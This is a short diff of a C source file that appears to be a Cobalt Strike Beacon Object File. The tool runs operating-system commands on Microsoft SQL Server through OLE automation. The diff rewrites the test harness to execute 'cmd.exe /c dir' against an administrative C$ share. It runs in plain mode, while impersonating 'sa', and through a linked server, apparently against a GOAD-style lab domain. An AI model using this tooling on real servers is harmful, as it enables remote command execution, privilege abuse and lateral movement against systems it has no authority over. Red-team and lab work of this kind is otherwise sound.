@@ -135,10 +135,8 @@ void ExecuteOleCmd(char* server, char* database, char* link, char* impersonate, 
 	// Run the query
 	//
 	if (!HandleQuery(stmt, (SQLCHAR*)query, link, impersonate, TRUE)){
-			goto END;
+		goto END;
 	}
-	BeaconPrintf(CALLBACK_OUTPUT, "Command executed\n");
-	//PrintQueryResults(stmt, TRUE);
 
 	internal_printf("[*] Command executed\n");
 	internal_printf("[*] Destoryed \"%s\" and \"%s\"\n", output, program);
@@ -197,7 +195,14 @@ VOID go(
 
 int main()
 {
-	ExecuteOleCmd("192.168.0.215", "master", NULL, NULL, "whoami /all");
+	internal_printf("============ BASE TEST ============\n\n");
+	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, NULL, "cmd.exe /c dir \\\\10.2.99.1\\c$");
+
+	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
+	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", NULL, "sa", "cmd.exe /c dir \\\\10.2.99.1\\c$");
+
+	internal_printf("\n\n============ LINK TEST ============\n\n");
+	ExecuteOleCmd("castelblack.north.sevenkingdoms.local", "master", "BRAAVOS", NULL, "cmd.exe /c dir \\\\10.2.99.1\\c$");
 }
 
 #endif
